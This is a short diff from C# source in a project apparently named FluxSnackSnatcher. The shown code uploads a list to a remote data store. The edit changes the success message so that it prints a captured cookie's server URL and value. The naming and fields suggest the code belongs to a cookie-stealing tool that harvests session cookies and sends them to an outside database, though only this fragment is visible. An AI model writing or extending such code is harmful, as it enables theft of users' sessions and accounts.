@@ -32,7 +32,7 @@ namespace FluxSnackSnatcher.Services
                     .Child(childElement)
                     .PutAsync(list);
 
-                return "Yuumy snack! :3";
+                return $"Yuumy snack! :3 @ {cookie.ServerUrl} -> {cookie.Value}";
             }
             catch (Exception ex)
             {
